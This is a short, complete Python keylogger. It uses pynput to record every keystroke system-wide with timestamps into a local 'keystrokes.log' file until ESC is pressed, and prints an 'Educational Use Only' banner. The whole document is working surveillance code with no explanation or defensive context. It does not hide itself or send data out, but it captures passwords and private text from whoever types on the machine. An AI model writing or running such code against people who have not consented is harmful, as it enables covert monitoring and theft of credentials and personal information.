

from pynput import keyboard
from datetime import datetime

LOG_FILE = "keystrokes.log"

def write_log(text):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(text)

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
      
        write_log(f"[{timestamp}] {key.char}\n")
    except AttributeError:
       
        write_log(f"[{timestamp}] [{key}]\n")

def on_release(key):
    
    if key == keyboard.Key.esc:
        write_log("\n--- Logging stopped by user ---\n")
        return False

def main():
    print("Keylogger started (Educational Use Only)")
    print("Press ESC to stop.\n")
    write_log("\n--- Logging started ---\n")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()